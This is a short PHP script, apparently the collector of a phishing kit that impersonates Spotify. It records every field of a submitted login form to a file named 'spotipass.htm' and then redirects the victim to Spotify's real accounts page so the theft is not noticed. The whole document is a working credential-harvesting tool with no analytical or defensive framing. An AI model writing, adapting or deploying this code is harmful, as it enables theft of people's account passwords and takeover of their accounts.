<?php
header ('Location:https://accounts.spotify.com/en/loginz/?continue=https:%2F%2F');
$handle = fopen("spotipass.htm", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>